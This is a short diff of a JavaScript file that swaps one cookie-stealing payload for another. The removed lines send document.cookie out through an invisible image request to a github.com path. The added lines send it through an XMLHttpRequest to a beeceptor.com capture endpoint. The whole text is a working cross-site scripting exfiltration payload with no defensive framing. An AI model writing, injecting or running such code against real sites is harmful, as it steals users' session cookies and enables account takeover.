@@ -1,4 +1,3 @@
-var img = document.createElement('img');
-img.width = 0;
-img.height = 0;
-img.src = 'https://github.com/ESJiang/test/blob/master/get.jsp?msg='+encodeURIComponent(document.cookie);
+x=new XMLHttpRequest(); 
+x.open("GET","https://qqqqq.free.beeceptor.com"+document.cookie);
+x.send();
